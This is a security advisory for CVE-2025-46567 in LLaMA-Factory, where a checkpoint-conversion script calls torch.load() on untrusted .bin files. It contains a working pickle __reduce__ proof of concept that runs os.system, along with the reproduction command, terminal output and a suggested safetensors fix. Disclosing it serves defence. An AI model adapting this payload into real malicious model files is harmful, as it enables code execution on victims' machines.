# [M] LLaMA-Factory Allows Arbitrary Code Execution via Unsafe Deserialization in Ilamafy_baichuan2.py

## Summary
Severity: Medium
Advisory: GHSA-f2f7-gj54-6vpv
CVE: CVE-2025-46567
CWE: CWE-502
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:L (CVSS_V3)
Published: 2025-04-23
Source: https://github.com/advisories/GHSA-f2f7-gj54-6vpv
Type: github-advisory

## Affected
- PyPI: `llamafactory` — affected >=0 <0.9.3

## Details
### Description

A critical vulnerability exists in the `llamafy_baichuan2.py` script of the [LLaMA-Factory](https://github.com/hiyouga/LLaMA-Factory) project. The script performs insecure deserialization using `torch.load()` on user-supplied `.bin` files from an input directory. An attacker can exploit this behavior by crafting a malicious `.bin` file that executes arbitrary commands during deserialization.

### Attack Vector

This vulnerability is **exploitable without authentication or privileges** when a user is tricked into:

1. Downloading or cloning a malicious project folder containing a crafted `.bin` file (e.g. via zip file, GitHub repo).
2. Running the provided conversion script `llamafy_baichuan2.py`, either manually or as part of an example workflow.

No elevated privileges are required. The user only needs to run the script with an attacker-supplied `--input_dir`. 

### Impact

- Arbitrary command execution (RCE)
- System compromise
- Persistence or lateral movement in shared compute environments


### Proof of Concept (PoC)

```python
# malicious_payload.py
import torch, pickle, os

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("mkdir HACKED!",))  # Arbitrary command

malicious_data = {
    "v_head.summary.weight": MaliciousPayload(),
    "v_head.summary.bias": torch.randn(10)
}

with open("value_head.bin", "wb") as f:
    pickle.dump(malicious_data, f)
```

An example of `config.json`:

```json
{
  "model": "value_head.bin",
  "hidden_size": 4096,
  "num_attention_heads": 32,
  "num_hidden_layers": 24,
  "initializer_range": 0.02,
  "intermediate_size": 11008,
  "max_position_embeddings": 4096,
  "kv_channels": 128,
  "layer_norm_epsilon": 1e-5,
  "tie_word_embeddings": false,
  "vocab_size": 151936
}
```

```bash
(base) root@d6ab70067470:~/LLaMA-Factory_latest# tree
.
`-- LLaMA-Factory
    |-- LICENSE
    |-- README.md
    |-- malicious_folder
    |   |-- config.json
    |   `-- value_head.bin
    `-- xxxxx(Irrelevant documents omitted)
```


```bash
# Reproduction
python scripts/convert_ckpt/llamafy_baichuan2.py --input_dir ./malicious_folder --output_dir ./out
```

➡️ Running this will execute the malicious payload and create a `HACKED!` folder.

```bash
(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# ls
CITATION.cff  LICENSE  MANIFEST.in  Makefile  README.md  README_zh.md  assets  data  docker  evaluation  examples  malicious_folder  pyproject.toml  requirements.txt  scripts  setup.py  src  tests
(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# python scripts/convert_ckpt/llamafy_baichuan2.py --input_dir ./malicious_folder --output_dir ./out
2025-04-23 07:36:58.435304: E external/local_xla/xla/stream_executor/cuda/cuda_fft.cc:477] Unable to register cuFFT factory: Attempting to register factory for plugin cuFFT when one has already been registered
WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
E0000 00:00:1745393818.451398    1008 cuda_dnn.cc:8310] Unable to register cuDNN factory: Attempting to register factory for plugin cuDNN when one has already been registered
E0000 00:00:1745393818.456423    1008 cuda_blas.cc:1418] Unable to register cuBLAS factory: Attempting to register factory for plugin cuBLAS when one has already been registered
2025-04-23 07:36:58.472951: I tensorflow/core/platform/cpu_feature_guard.cc:210] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
Load weights:  50%|██████████████████████████████████████████████████████████████████████████████████▌                                                                                  | 1/2 [00:00<00:00, 123.70it/s]
Traceback (most recent call last):
  File "/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py", line 112, in <module>
    fire.Fire(llamafy_baichuan2)
  File "/root/miniconda3/lib/python3.12/site-packages/fire/core.py", line 135, in Fire
    component_trace = _Fire(component, args, parsed_flag_args, context, name)
                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/fire/core.py", line 468, in _Fire
    component, remaining_args = _CallAndUpdateTrace(
                                ^^^^^^^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/fire/core.py", line 684, in _CallAndUpdateTrace
    component = fn(*varargs, **kwargs)
                ^^^^^^^^^^^^^^^^^^^^^^
  File "/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py", line 107, in llamafy_baichuan2
    save_weight(input_dir, output_dir, shard_size, save_safetensors)
  File "/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py", line 35, in save_weight
    shard_weight = torch.load(os.path.join(input_dir, filepath), map_location="cpu")
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/torch/serialization.py", line 1040, in load
    return _legacy_load(opened_file, map_location, pickle_module, **pickle_load_args)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/torch/serialization.py", line 1260, in _legacy_load
    raise RuntimeError("Invalid magic number; corrupt file?")
RuntimeError: Invalid magic number; corrupt file?
(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# ls
 CITATION.cff   LICENSE       Makefile    README_zh.md   data     evaluation   malicious_folder   pyproject.toml     scripts    src
'HACKED!'       MANIFEST.in   README.md   assets         docker   examples     out                requirements.txt   setup.py   tests
```

### Affected File(s)

- https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35
- `scripts/convert_ckpt/llamafy_baichuan2.py`
- Line: `torch.load(os.path.join(input_dir, filepath), map_location="cpu")`

### Suggested Fix

- Replace `torch.load()` with safer alternatives like `safetensors`.
- Validate and whitelist file types before deserialization.
- Require checksum validation.

Example patch:

```python
# Replace torch.load() with safe deserialization
try:
    from safetensors.torch import load_file
    tensor_data = load_file(filepath)
except Exception:
    print("Invalid or unsafe checkpoint file.")
    return
```

### Workarounds

- Avoid running the script with untrusted `.bin` files.
- Use containers or VMs to isolate script execution.

### References

- [torch.load() — PyTorch Docs](https://pytorch.org/docs/stable/generated/torch.load.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)

### Credits

Discovered and reported by [Yu Rong](https://github.com/Anchor0221) and [Hao Fan](https://github.com/xhjy2020), 2025-04-23

## References
- https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-f2f7-gj54-6vpv
- https://nvd.nist.gov/vuln/detail/CVE-2025-46567
- https://github.com/hiyouga/LLaMA-Factory/commit/2989d39239d2f46e584c1e1180ba46b9768afb2a
- https://github.com/hiyouga/LLaMA-Factory
- https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35
